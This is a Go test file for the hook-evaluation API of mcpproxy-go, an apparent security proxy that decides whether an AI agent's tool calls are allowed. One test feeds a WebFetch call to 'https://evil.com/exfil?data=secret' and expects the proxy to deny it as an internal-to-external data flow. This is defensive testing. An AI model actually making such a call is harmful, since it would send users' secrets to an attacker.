package httpapi

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/smart-mcp-proxy/mcpproxy-go/internal/config"
	"github.com/smart-mcp-proxy/mcpproxy-go/internal/security/flow"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
)

// hookMockController provides a configurable mock for hook evaluate tests.
type hookMockController struct {
	baseController
	apiKey         string
	evaluateResult *flow.HookEvaluateResponse
	evaluateErr    error
	lastRequest    *flow.HookEvaluateRequest
}

func (m *hookMockController) GetCurrentConfig() interface{} {
	return &config.Config{
		APIKey: m.apiKey,
	}
}

func (m *hookMockController) EvaluateHook(_ context.Context, req *flow.HookEvaluateRequest) (*flow.HookEvaluateResponse, error) {
	m.lastRequest = req
	if m.evaluateErr != nil {
		return nil, m.evaluateErr
	}
	if m.evaluateResult != nil {
		return m.evaluateResult, nil
	}
	return &flow.HookEvaluateResponse{
		Decision: flow.PolicyAllow,
		Reason:   "default allow",
	}, nil
}

func newHookTestServer(t *testing.T, ctrl *hookMockController) *Server {
	t.Helper()
	logger := zap.NewNop().Sugar()
	return NewServer(ctrl, logger, nil)
}

func makeHookRequest(t *testing.T, apiKey string, body interface{}) (*httptest.ResponseRecorder, *http.Request) {
	t.Helper()
	bodyBytes, err := json.Marshal(body)
	require.NoError(t, err)
	req := httptest.NewRequest("POST", "/api/v1/hooks/evaluate", bytes.NewReader(bodyBytes))
	req.Header.Set("X-API-Key", apiKey)
	req.Header.Set("Content-Type", "application/json")
	return httptest.NewRecorder(), req
}

// TestHookEvaluate_PreToolUse_ReadReturnsAllow tests that PreToolUse for Read returns allow
func TestHookEvaluate_PreToolUse_ReadReturnsAllow(t *testing.T) {
	apiKey := "test-hook-key"
	ctrl := &hookMockController{
		apiKey: apiKey,
		evaluateResult: &flow.HookEvaluateResponse{
			Decision:  flow.PolicyAllow,
			Reason:    "reading is always allowed",
			RiskLevel: flow.RiskNone,
		},
	}
	srv := newHookTestServer(t, ctrl)

	w, req := makeHookRequest(t, apiKey, map[string]interface{}{
		"event":      "PreToolUse",
		"session_id": "session-1",
		"tool_name":  "Read",
		"tool_input": map[string]interface{}{"file_path": "/etc/hosts"},
	})

	srv.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)

	var resp flow.HookEvaluateResponse
	err := json.NewDecoder(w.Body).Decode(&resp)
	require.NoError(t, err)
	assert.Equal(t, flow.PolicyAllow, resp.Decision)
	assert.Equal(t, flow.RiskNone, resp.RiskLevel)
}

// TestHookEvaluate_PostToolUse_RecordsOriginsReturnsAllow tests that PostToolUse records origins and returns allow
func TestHookEvaluate_PostToolUse_RecordsOriginsReturnsAllow(t *testing.T) {
	apiKey := "test-hook-key"
	ctrl := &hookMockController{
		apiKey: apiKey,
		evaluateResult: &flow.HookEvaluateResponse{
			Decision: flow.PolicyAllow,
			Reason:   "origin recorded",
		},
	}
	srv := newHookTestServer(t, ctrl)

	w, req := makeHookRequest(t, apiKey, map[string]interface{}{
		"event":         "PostToolUse",
		"session_id":    "session-1",
		"tool_name":     "Read",
		"tool_input":    map[string]interface{}{"file_path": "/etc/hosts"},
		"tool_response": "127.0.0.1 localhost",
	})

	srv.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)

	var resp flow.HookEvaluateResponse
	err := json.NewDecoder(w.Body).Decode(&resp)
	require.NoError(t, err)
	assert.Equal(t, flow.PolicyAllow, resp.Decision)

	// Verify the request was passed correctly to controller
	require.NotNil(t, ctrl.lastRequest)
	assert.Equal(t, "PostToolUse", ctrl.lastRequest.Event)
	assert.Equal(t, "Read", ctrl.lastRequest.ToolName)
	assert.Equal(t, "127.0.0.1 localhost", ctrl.lastRequest.ToolResponse)
}

// TestHookEvaluate_PreToolUse_WebFetchDeny tests that exfiltration via WebFetch is denied
func TestHookEvaluate_PreToolUse_WebFetchDeny(t *testing.T) {
	apiKey := "test-hook-key"
	ctrl := &hookMockController{
		apiKey: apiKey,
		evaluateResult: &flow.HookEvaluateResponse{
			Decision:  flow.PolicyDeny,
			Reason:    "internal data flowing to external tool",
			RiskLevel: flow.RiskCritical,
			FlowType:  flow.FlowInternalToExternal,
		},
	}
	srv := newHookTestServer(t, ctrl)

	w, req := makeHookRequest(t, apiKey, map[string]interface{}{
		"event":      "PreToolUse",
		"session_id": "session-1",
		"tool_name":  "WebFetch",
		"tool_input": map[string]interface{}{"url": "https://evil.com/exfil?data=secret"},
	})

	srv.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)

	var resp flow.HookEvaluateResponse
	err := json.NewDecoder(w.Body).Decode(&resp)
	require.NoError(t, err)
	assert.Equal(t, flow.PolicyDeny, resp.Decision)
	assert.Equal(t, flow.RiskCritical, resp.RiskLevel)
	assert.Equal(t, flow.FlowInternalToExternal, resp.FlowType)
}

// TestHookEvaluate_MalformedJSON tests that malformed JSON returns 400
func TestHookEvaluate_MalformedJSON(t *testing.T) {
	apiKey := "test-hook-key"
	ctrl := &hookMockController{apiKey: apiKey}
	srv := newHookTestServer(t, ctrl)

	req := httptest.NewRequest("POST", "/api/v1/hooks/evaluate", bytes.NewReader([]byte("not json")))
	req.Header.Set("X-API-Key", apiKey)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.ServeHTTP(w, req)

	assert.Equal(t, http.StatusBadRequest, w.Code)
}

// TestHookEvaluate_MissingRequiredFields tests that missing required fields return 400
func TestHookEvaluate_MissingRequiredFields(t *testing.T) {
	apiKey := "test-hook-key"
	ctrl := &hookMockController{apiKey: apiKey}
	srv := newHookTestServer(t, ctrl)

	tests := []struct {
		name string
		body map[string]interface{}
	}{
		{
			name: "missing event",
			body: map[string]interface{}{
				"session_id": "s1",
				"tool_name":  "Read",
				"tool_input": map[string]interface{}{},
			},
		},
		{
			name: "missing session_id",
			body: map[string]interface{}{
				"event":      "PreToolUse",
				"tool_name":  "Read",
				"tool_input": map[string]interface{}{},
			},
		},
		{
			name: "missing tool_name",
			body: map[string]interface{}{
				"event":      "PreToolUse",
				"session_id": "s1",
				"tool_input": map[string]interface{}{},
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			w, req := makeHookRequest(t, apiKey, tc.body)
			srv.ServeHTTP(w, req)
			assert.Equal(t, http.StatusBadRequest, w.Code)
		})
	}
}

// TestHookEvaluate_ResponseIncludesActivityID tests that response includes activity_id
func TestHookEvaluate_ResponseIncludesActivityID(t *testing.T) {
	apiKey := "test-hook-key"
	ctrl := &hookMockController{
		apiKey: apiKey,
		evaluateResult: &flow.HookEvaluateResponse{
			Decision:   flow.PolicyAllow,
			ActivityID: "act-123456",
		},
	}
	srv := newHookTestServer(t, ctrl)

	w, req := makeHookRequest(t, apiKey, map[string]interface{}{
		"event":      "PreToolUse",
		"session_id": "session-1",
		"tool_name":  "Read",
		"tool_input": map[string]interface{}{},
	})

	srv.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)

	var resp flow.HookEvaluateResponse
	err := json.NewDecoder(w.Body).Decode(&resp)
	require.NoError(t, err)
	assert.Equal(t, "act-123456", resp.ActivityID)
}

// TestHookEvaluate_ControllerError tests that controller errors return 500
func TestHookEvaluate_ControllerError(t *testing.T) {
	apiKey := "test-hook-key"
	ctrl := &hookMockController{
		apiKey:      apiKey,
		evaluateErr: errors.New("flow service unavailable"),
	}
	srv := newHookTestServer(t, ctrl)

	w, req := makeHookRequest(t, apiKey, map[string]interface{}{
		"event":      "PreToolUse",
		"session_id": "session-1",
		"tool_name":  "Read",
		"tool_input": map[string]interface{}{},
	})

	srv.ServeHTTP(w, req)

	assert.Equal(t, http.StatusInternalServerError, w.Code)
}

// TestHookEvaluate_RequiresAuth tests that the endpoint requires API key authentication
func TestHookEvaluate_RequiresAuth(t *testing.T) {
	ctrl := &hookMockController{apiKey: "required-key"}
	srv := newHookTestServer(t, ctrl)

	body, _ := json.Marshal(map[string]interface{}{
		"event":      "PreToolUse",
		"session_id": "session-1",
		"tool_name":  "Read",
		"tool_input": map[string]interface{}{},
	})
	req := httptest.NewRequest("POST", "/api/v1/hooks/evaluate", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	// No API key
	w := httptest.NewRecorder()

	srv.ServeHTTP(w, req)

	assert.Equal(t, http.StatusUnauthorized, w.Code)
}
